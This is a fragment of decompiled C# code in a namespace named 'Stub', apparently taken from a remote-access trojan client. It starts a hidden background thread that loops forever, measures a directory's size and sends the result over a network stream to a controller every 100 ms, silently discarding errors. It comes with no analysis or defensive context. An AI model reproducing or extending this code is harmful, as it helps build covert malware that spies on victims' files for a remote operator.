using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub
{
	// Token: 0x0200004C RID: 76
	public class GClass2
	{
		// Token: 0x060000FD RID: 253 RVA: 0x0000223D File Offset: 0x0000043D
		public void method_0(string String_0)
		{
			this.thread_0 = new Thread(delegate(object object_0)
			{
				this.method_1(Conversions.ToString(object_0));
			});
			this.thread_0.IsBackground = true;
			this.thread_0.SetApartmentState(ApartmentState.STA);
			this.thread_0.Start(String_0);
		}

		// Token: 0x060000FE RID: 254 RVA: 0x000067F0 File Offset: 0x000049F0
		public void method_1(string String_0)
		{
			for (;;)
			{
				try
				{
					if (Directory.Exists(String_0))
					{
						GClass0.smethod_2(GClass0.networkStream_0, "23|" + Conversions.ToString(Math.Round((double)new GClass1().method_0(String_0) / 1024.0 / 1024.0)));
					}
				}
				catch (Exception ex)
				{
				}
				Thread.Sleep(100);
			}
		}

		// Token: 0x060000FF RID: 255 RVA: 0x0000227A File Offset: 0x0000047A
		public void method_2()
		{
			this.thread_0.Abort();
		}

		// Token: 0x06000100 RID: 256 RVA: 0x00002287 File Offset: 0x00000487
		[CompilerGenerated]
		public void method_3(object object_0)
		{
			this.method_1(Conversions.ToString(object_0));
		}

		// Token: 0x040000AB RID: 171
		public Thread thread_0;
	}
}
